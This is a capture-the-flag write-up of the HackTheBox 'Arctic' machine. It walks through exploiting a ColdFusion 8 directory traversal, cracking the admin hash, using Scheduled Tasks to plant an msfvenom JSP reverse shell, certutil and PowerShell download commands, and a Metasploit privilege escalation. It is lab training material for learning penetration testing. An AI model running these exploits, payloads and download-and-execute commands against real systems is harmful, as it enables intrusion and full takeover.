# References
1. [Arctic Writeup (absolomb.com)](https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/)
2. [Arctic Writeup (medium.com)](https://medium.com/@Rehman.Beg/hackthebox-arctic-writeup-442d2b268833)

# Summary
### 1. NMAP
Running NMAP, we see 3 ports are opened. Ports 135 & 49154 runs Microsoft RPC Service, while Port 8500 runs FMTP Service.

### 2. Enumeration & Attack Attempt 1: MSRPC
No searchsploit for msrpc, and with Google, we find a metasploit exploit `exploit/multi/misc/msf_rpc_console` which required a username and password which we do not have. Unable to use this exploit, we move on.

### 3. Enumeration & Attack Attempt 2: FMTP
Searchsploit for fmtp didn't show anything. However, we could navigate to `http://10.10.10.11:8500` on our browser even though it took forever to load. We found out Port 8500 serves Adobe ColdFusion, and `http://10.10.10.11:8500/CFIDE/administrator/` is a ColdFusion 8 Administrator login page.

### 4. Further Enumeration of Port 8500, FMTP
From the source page of the ColdFusion 8 login page, we see that the password is encrypted with SHA1. Enumerating through the rest of the subdirectories on `http://10.10.10.11:8500` did not reveal anything else.

### 5. Finding & Attacking with Adobe ColdFusion 8 Exploits
Doing a Searchsploit on Coldfusion showed a few possible attacks. Trying `Directory Traversal 14641.py`, we see a SHA1 password, where we can use Crackstation to get the password "happyday". With the password we just obtained, we are able to log into the administrator page, `http://10.10.10.11:8500/CFIDE/administrator/`.

### 6. Enumerating ColdFusion Administrative Page
We were unable to find a use for the admin page, except a System Information button where we found it is a machine running Windows Vista 6.1, ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user tolis, path C:\Users\tolis.

### 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
We try a Metasploit exploit `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload. Since it failed, we move on to another method, Scheduled Tasks. However, the official documentation continues to use this `ColdFusion 8.0.1 Arbitrary File Upload and Execute` exploit with the help of Burp Suite.

### 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
On the ColdFusion administrative site `http://10.10.10.11:8500/CFIDE/administrator/`, there was actually a Scheduled Tasks functionality where we cound use it to schedule the payload to be downloaded.

ColdFusion will execute `.cfm` & `.jsp` files. We ended up generating a `.jsp` reverse shell with msfvenom. Through the ColdFusion Mappings, we see 2 file paths where we could potentially place our reverse shells in.

We start a HTTP Server serving the `jsp_shell.jsp` payload. Afterwards, we scheduled a task, to download the payload from our HTTP Server, and save it in one of the file mappings, `C:\ColdFusion8\wwwroot\CFIDE\jsp_shell.jsp`. We start a nc listener, and ran our `jsp_shell.jsp` by navigating to `http://10.10.10.11:8500/CFIDE/jsp_shell.jsp` on our browser. We got into a regular shell, and got our first user flag here.

### 9. Privilege Escalation
To privilege escalate, we choose to get a meterpreter shell to make things easier. We create a meterpreter reverse shell with msfvenom, host it on our Python HTTP Server. We then use our regular shell we got from earlier to download the meterpreter shell with `certutil.exe`.

After setting a `multi/handler` to listen for the meterpreter connection, we run our meterpreter payload, and got a meterpreter shell successfully. Since `getsystem` did not work, we use `recon/local_exploit_sugester` to find exploits to privilege escalate.

Trying `ms10_092_schelevator` worked, we got system rights and the system flag.

# Attack
## 1. NMAP
Start.
```
hippoeug@kali:~$ nmap --script vuln 10.129.127.126 -sC -sV -Pn -v
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 03:17 +08
...
Scanning 10.129.127.126 [1000 ports]
Discovered open port 135/tcp on 10.129.127.126
Discovered open port 8500/tcp on 10.129.127.126
Discovered open port 49154/tcp on 10.129.127.126
...
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
Windows OS with three ports, let's move on.

## 2. Enumeration & Attack Attempt 1: MSRPC
Let's start finding some possible vulnerabilities.
```
hippoeug@kali:~$ searchsploit msrpc
Exploits: No Results
Shellcodes: No Results
```
Nothing. Hmm, let's Google for some potential exploits we can use, and we see [one](https://www.rapid7.com/db/modules/exploit/multi/misc/msf_rpc_console/).
```
msf5 > use exploit/multi/misc/msf_rpc_console
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/misc/msf_rpc_console) > show targets
...
msf5 exploit(multi/misc/msf_rpc_console) > set target 1
target => 1
msf5 exploit(multi/misc/msf_rpc_console) > show options

Module options (exploit/multi/misc/msf_rpc_console):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Password for the specified username
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     55552            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  msf              yes       Username for Metasploit RPC
...
```
Oh dang it, we need a Username and Password for the RPC. Time to try something else.

## 3. Enumeration & Attack Attempt 2: FMTP
Let's searchspoit FMTP and see what we get.
```
hippoeug@kali:~$ searchsploit fmtp
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Asterisk chan_pjsip 15.2.0 - 'SDP fmtp' Denial of Service                                                                           | linux/dos/44183.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Crap. DoS is not what we need. We were also unable to find any potential attacks on Google.

Honestly at this point, I was stuck and had to look for some clues online. Turns out, I simply "forgotten" one of the fundamentals, which is to try accessing these ports on a web browser. Port 80 (HTTP) & port 443 (HTTPS) aren't the only ports available on a web browser!

Navigating to `http://10.10.10.11:8500`, which takes forever to load, we see what seems to be a listing of a file system.

![index](https://user-images.githubusercontent.com/21957042/114262157-0c838700-9a11-11eb-877b-9ab18112a892.png)

Very cool, let's see `CFIDE/` first.

![CFIDE](https://user-images.githubusercontent.com/21957042/114262158-0e4d4a80-9a11-11eb-8e81-3d8708d545de.png)

Hmm, doing some Googling, we see `.cfm` is a Cold Fusion Markup file, which are web pages made up of specific code that enables scripts and applications to run on a ColdFusion web server. Let's KIV this.

Going top down, we enumerate `adminapi/` next.

![CFIDE adminapi](https://user-images.githubusercontent.com/21957042/114262159-0ee5e100-9a11-11eb-8d4a-e905652f3288.png)

Ah, looks like more config files of sorts. Let's move to the next one, `administrator/`.

Enumerating to `http://10.10.10.11:8500/CFIDE/administrator/`, we see a that it is not a directory, but instead a Adobe ColdFusion 8 Administrator login page, with a Username `admin` that cannot be changed.

![CFIDE administrator](https://user-images.githubusercontent.com/21957042/114262161-0f7e7780-9a11-11eb-9514-5638655b5486.png)

We got a few ways to continue this, either looking for a password to login, search for vulnerabities with searchsploit etc, dirbuster this, or something.

## 4. Further Enumeration of Port 8500, FMTP
Inspecting the source page of the `CFIDE/administrator/` login page, we see something interesting.
```
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```
From this, we know that the salted password is encrypted with SHA1.

Let's enumerate a little more down the list of directories.

![CFIDE classes](https://user-images.githubusercontent.com/21957042/114262162-10170e00-9a11-11eb-84fd-d6efb01b2d21.png)

![CFIDE componentutil](https://user-images.githubusercontent.com/21957042/114262163-10170e00-9a11-11eb-9284-87f4d52541b3.png)

![CFIDE debug](https://user-images.githubusercontent.com/21957042/114262164-11483b00-9a11-11eb-84c0-df9f5513174e.png)

![CFIDE debug includes](https://user-images.githubusercontent.com/21957042/114262165-11e0d180-9a11-11eb-9c91-135a3baa9e7e.png)

![CFIDE images](https://user-images.githubusercontent.com/21957042/114262172-1907df80-9a11-11eb-81c4-14bb1a42fc53.png)

![CFIDE scripts](https://user-images.githubusercontent.com/21957042/114262173-1a390c80-9a11-11eb-8dfe-ff9880d0d9dd.png)

![CFIDE wizards](https://user-images.githubusercontent.com/21957042/114262174-1ad1a300-9a11-11eb-892b-bd420c364b6a.png)

![CFIDE wizards common](https://user-images.githubusercontent.com/21957042/114262175-1b6a3980-9a11-11eb-94bd-ef560b231422.png)

Ah, we cannot find a file that we can use to our advantage.

## 5. Finding & Attacking with Adobe ColdFusion 8 Exploits
As usual, we will do a Searchsploit on Adobe ColdFusion 8.
```
hippoeug@kali:~$ searchsploit coldfusion
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                 | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                              | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                 | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                         | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                       | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                   | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                  | cfm/webapps/36172.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                           | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                              | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                     | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                           | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                        | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                     | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                              | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting                               | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                 | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                                       | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                                              | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                   | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                             | multiple/webapps/25305.py
...
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Already, we see some interesting results, lots of options to try.

To aid our job, we also do a Google search in hopes of finding the most common vulnerability, one we could try first.
We see [exploit](https://www.exploit-db.com/exploits/14641) `Adobe ColdFusion - Directory Traversal 14641.py`. Apparently, this exploit "exploits a directory traversal bug in Adobe ColdFusion, by reading the password.properties a user can login using the encrypted password itself. This should work on version 8 and below.".

Additionally, another [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute`. We might need to try this later on if a payload if required to be uploaded.

Let's try the `Directory Traversal` exploit, `14641.py`.
```
hippoeug@kali:~$ searchsploit -m 14641.py
  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable, with CRLF line terminators

hippoeug@kali:~$ python 14641.py
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

hippoeug@kali:~$ python 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/archives/index.cfm
title from server in /CFIDE/administrator/archives/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /cfide/install.cfm
title from server in /cfide/install.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```
Ooh! Very interesting, we see a password `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`, which looks like a Hash. Since we know from earlier password is a SHA1 hash, we can use Crackstation to get the password.
```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03	sha1	happyday
```
With this password `happyday`, let's go back to `http://10.10.10.11:8500/CFIDE/administrator/` and try to login.

We get directed to `10.10.10.11:8500/CFIDE/administrator/index.cfm` and successfully got in!

NOTE: While browsing through other write-ups, I found out that navigating directly to URL `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`, taken from [14641.py](https://www.exploit-db.com/exploits/14641), displays the hash password on screen immediately.

![Passwordhash](https://user-images.githubusercontent.com/21957042/114262176-1c02d000-9a11-11eb-8229-e22ed777e167.png)

## 6. Enumerating ColdFusion Administrative Page
Back to `http://10.10.10.11:8500/CFIDE/administrator/` and and supply the password `happyday`.

![BackToAdminPage](https://user-images.githubusercontent.com/21957042/114262177-1c9b6680-9a11-11eb-82c8-5ace21f54861.png)

Looking through the Administrator page, we could only see various Menus to view or modify.

![AdminWebPage](https://user-images.githubusercontent.com/21957042/114262178-1d33fd00-9a11-11eb-911c-23b0990d8d73.png)

```
Expand All / Collapse All

Server Settings 
	Settings
	Request Tuning
	Caching
	Client Variables
	Memory Variables
	Mappings
	Mail
	Charting
	Font Management
	Java and JVM
	Settings Summary
Data & Services
	Data Sources
	Verity Collections
	Verity K2 Server
	Web Services
	Flex Integration
Debugging & Logging
	Debug Output Settings
	Debugging IP Addresses
	Debugger Settings
	Logging Settings
	Log Files
	Scheduled Tasks
	System Probes
	Code Analyzer
	License Scanner
Server Monitoring
	Server Monitor
Extensions
	Java Applets
	CFX Tags
	Custom Tag Paths
	CORBA Connectors
Event Gateways
	Settings
	Gateway Types
	Gateway Instances
Security
	Administrator
	RDS
	Sandbox Security
	User Manager
Packaging & Deployment
	ColdFusion Archives
	J2EE Archives
```
Nothing interesting unfortunately. Suddenly, on the top right corner, I noticed a "System Information" button.

![SystemInfo](https://user-images.githubusercontent.com/21957042/114262179-1dcc9380-9a11-11eb-9a4b-a28707c377c4.png)

Here's the System Information:
```
Server Details
Server Product 	ColdFusion
Version 	8,0,1,195765  
Edition 	Developer  
Serial Number 	Developer  
Operating System 	Windows Vista  
OS Version 	6.1  

JVM Details
Java Version 	1.6.0_04  
Java Vendor 	Sun Microsystems Inc.  
Java Vendor URL 	http://java.sun.com/
Java Home 	C:\ColdFusion8\runtime\jre  
Java File Encoding 	Cp1253  
Java Default Locale 	el_GR  
File Separator 	\  
Path Separator 	;  
Line Separator 	Chr(13)
User Name 	tolis  
User Home 	C:\Users\tolis  
User Dir 	C:\ColdFusion8\runtime\bin  
Java VM Specification Version 	1.0  
Java VM Specification Vendor 	Sun Microsystems Inc.  
Java VM Specification Name 	Java Virtual Machine Specification  
Java VM Version 	10.0-b19  
Java VM Vendor 	Sun Microsystems Inc.  
Java VM Name 	Java HotSpot(TM) 64-Bit Server VM  
Java Specification Version 	1.6  
Java Specification Vendor 	Sun Microsystems Inc.  
Java Specification Name 	Java Platform API Specification  
Java Class Version 	50.0  
...

Printer Details
Default Printer 	Microsoft XPS Document Writer
Printers 	Microsoft XPS Document Writer 
```
Perfect. We now know it's a Windows Vista 6.1, running ColdFusion v8.0.1.195765 & JVM v1.6.0_04. We also know there is a user `tolis`, path `C:\Users\tolis`.

## 7. Attacking Machine by Uploading Payload Attempt 1: fck_editor Exploit
As we noted previously, it is perhaps time to deploy the [exploit with Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) titled `ColdFusion 8.0.1 Arbitrary File Upload and Execute` to upload a payload.
```
msf5 > use exploit/windows/http/coldfusion_fckeditor
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf5 exploit(windows/http/coldfusion_fckeditor) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf5 exploit(windows/http/coldfusion_fckeditor) > show targets
...
msf5 exploit(windows/http/coldfusion_fckeditor) > set rhost 10.10.10.11
rhost => 10.10.10.11
msf5 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
rport => 8500
...
msf5 exploit(windows/http/coldfusion_fckeditor) > show options

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          8500                                                                        yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                      no        HTTP server virtual host


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.x.x      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target


msf5 exploit(windows/http/coldfusion_fckeditor) > exploit

[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
```
Within seconds of `[*] Sending our POST request...`, it returned with `[-] Upload Failed...`. This apparently is an unusual, quoting IppSec that every request to `10.10.10.11` takes about 30s to return something, there is no way this exploit would know that this request failed this quickly.

At this point, I am lost and looked online for guidance. The official documentation & [IppSec](https://www.youtube.com/watch?v=e9lVyFH7-4o&feature=emb_title&ab_channel=IppSec) managed to still use this `exploit/windows/http/coldfusion_fckeditor` exploit, with the use of Burp Suite. "However, due to the request delay to the target, the Metasploit module fails to run and must be intercepted in Burp Suite, then requested through Burp Repeater." 

## 8. Attacking Machine by Uploading Payload Attempt 2: Scheduled Tasks
Not wanting to use the Burp suite method, I followed an alternative method as seen from other writeups. Turns out, I missed out a tool I could leverage on from the ColdFusion administrator site.
```
Debugging & Logging
	Debug Output Settings
	Debugging IP Addresses
	Debugger Settings
	Logging Settings
	Log Files
  ----> Scheduled Tasks
	System Probes
	Code Analyzer
	License Scanner
```
Scheduled Tasks! We could use this to download and run our reverse shell payload.

![Schedule](https://user-images.githubusercontent.com/21957042/114263516-82d7b780-9a18-11eb-9cef-3b8b8a13fc6b.png)

Let's create a payload.
```
hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter.exe
```

We run the Python HTTPServer also.
```
hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
```

Let's Schedule New Task.

![meterpreter_old](https://user-images.githubusercontent.com/21957042/114263514-81a68a80-9a18-11eb-9a5f-bb2e4c8e5738.png)

```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22
URL: http://10.10.x.x/meterpreter.exe
Publish: Save output to a file
File: C:\Users\tolis\meterpreter.exe
Submit
```
This task was scheduled successfully.

![ScheduledTask](https://user-images.githubusercontent.com/21957042/114263510-7fdcc700-9a18-11eb-832c-e743bd532210.png)

And start a nc listener.
```
hippoeug@kali:~$ nc -lvnp 4545
listening on [any] 4545 ...
```

Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".

![Success](https://user-images.githubusercontent.com/21957042/114263515-823f2100-9a18-11eb-8cf1-dece21b94138.png)

However, we are not able to execute this `meterpreter.exe` we just placed, as we do not have access to the file path.
Getting the payload in the location user Tolis directory isn't an issue, but running it is.

We need to find a path that we have access to from the browser. Navigating to Mappings under Server Settings, we see 2 paths.
```
Server Settings 
	Settings
	Request Tuning
	Caching
	Client Variables
	Memory Variables
   ---->Mappings
	Mail
	Charting
	Font Management
	Java and JVM
	Settings Summary
```

![Mapping](https://user-images.githubusercontent.com/21957042/114263507-7eab9a00-9a18-11eb-96dc-0989120b3fa5.png)

We will place our payload in `/CFIDE`, `C:\ColdFusion8\wwwroot\CFIDE\`. Let's Schedule New Task again. 

![meterpreter](https://user-images.githubusercontent.com/21957042/114263513-810df400-9a18-11eb-975b-2f3a2de2c065.png)

```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22
URL: http://10.10.x.x/meterpreter.exe
Publish: Save output to a file
File: C:\ColdFusion8\wwwroot\CFIDE\meterpreter.exe
Submit
```
This task was scheduled successfully.

Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".

To execute the payload we just placed, we need to go to the browser and navigate to `10.10.10.11:8500/CFIDE/meterpreter.exe`. However instead of running it, our browser attempts to download the `meterpreter.exe` payload instead. 

![Download](https://user-images.githubusercontent.com/21957042/114264349-f2e83c80-9a1c-11eb-9021-b4cebf127213.png)

We need to find a file extension that Adobe ColdFusion is willing to run. Upon some research, we found that ColdFusion will execute [`.cfm`](https://reboare.gitbooks.io/security/content/webshell.html) & `.jsp` files.

Since msfvenom allows for creation of `.jsp` webshell easily, we'll create a `.jsp` instead of `.cfm` payload.
```
hippoeug@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=4545 -f raw -o jsp_shell.jsp
Payload size: 1497 bytes
Saved as: jsp_shell.jsp
```

Let's Schedule New Task.

![jsp_shell](https://user-images.githubusercontent.com/21957042/114263512-80755d80-9a18-11eb-8daf-0d54dbb036fe.png)

```
Task Name: Reverse Shell
Frequency: Daily every 1 Min 1 Sec Start 6:22
URL: http://10.10.x.x/jsp_shell.jsp
Publish: Save output to a file
File: C:\ColdFusion8\wwwroot\CFIDE\jsp_shell.jsp
Submit
```
This task was scheduled successfully.

Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".

![Success](https://user-images.githubusercontent.com/21957042/114263515-823f2100-9a18-11eb-8cf1-dece21b94138.png)

To execute the payload we just placed, we need to go to the browser and navigate to `http://10.10.10.11:8500/CFIDE/jsp_shell.jsp`, and check our listener.
```
hippoeug@kali:~$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.x.x] from (UNKNOWN) [10.10.10.11] 50807
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
...
C:\Users\tolis\Desktop>type user.txt
type user.txt
02650d3a69a70780c302e146a6cb96f3

C:\Users>whoami
whoami
arctic\tolis

C:\Users>cd Administrator
cd Administrator
```
Nope, no Administrator access.

## 9. Privilege Escalation
Let's first try to get a meterpreter shell!

We'll write another msfvenom meterpreter payload with another port this time.
```
hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=6969 -f exe -o meterpreter_x.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter_x.exe
```

Let's download this meterpreter payload onto the system like we have always done, with `certutil.exe`.
```
C:\Users\tolis>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter_x.exe" meterpreter_x.exe
certutil.exe -urlcache -split -f "http://10.10.x.x:80/meterpreter_x.exe" meterpreter_x.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
```
Alternatively, we could also use Powershell to download the meterpreter payload.
```
C:\Users\tolis>powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.x.x:80/meterpreter_x.exe', 'ps.exe')
powershell (new-object System.Net.WebClient).Downloadfile('http://10.10.x.x:80/meterpreter_x.exe', 'ps.exe')
```

Before running the meterpreter payload with `C:\Users\tolis>meterpreter_x.exe`, we need to set up a listener.
```
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options
...
msf5 exploit(multi/handler) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf5 exploit(multi/handler) > set lport 6969
lport => 6969
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.x.x:6969 
[*] Sending stage (201283 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.x.x:6969 -> 10.10.10.11:52300) at 2021-01-24 21:33:35 +0800
 
meterpreter > getuid
Server username: ARCTIC\tolis
```
Unforunately we are not in `nt authority\system`.

We will try `getsystem` just for laughs.
```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
```
Nope.

Let's find some exploits!
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.11 - Collecting local exploits for x64/windows...
[*] 10.10.10.11 - 17 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.11 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
```
Hmm, `ms10_092_schelevator` looks promising!

We'll try that!
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > back
msf5 > use exploit/windows/local/ms10_092_schelevator
[*] Using configured payload windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/ms10_092_schelevator) > show options
...
msf5 exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.x.x:7070 
[*] Preparing payload at C:\Users\tolis\AppData\Local\Temp\vGjynjeSj.exe
[*] Creating task: BaOubZYx
[*] SUCCESS: The scheduled task "BaOubZYx" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\BaOubZYx...
[*] Original CRC32: 0xf306d707
[*] Final CRC32: 0xf306d707
[*] Writing our modified content back...
[*] Validating task: BaOubZYx
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] BaOubZYx                                 1/2/2021 11:44:00 ��   Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "BaOubZYx" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "BaOubZYx" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (176195 bytes) to 10.10.10.11
[*] SUCCESS: Attempted to run the scheduled task "BaOubZYx".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 3 opened (10.10.x.x:7070 -> 10.10.10.11:52366) at 2021-01-24 21:46:08 +0800
[*] SUCCESS: The scheduled task "BaOubZYx" was successfully deleted.
[*] SCHELEVATOR

meterpreter > sessions
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > dir
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-23 01:47:48 +0800  desktop.ini
100444/r--r--r--  32    fil   2017-03-23 03:01:59 +0800  root.txt

meterpreter > cat root.txt
ce65ceee66b2b5ebaff07e50508ffb90
```
Tada! We got system flag!
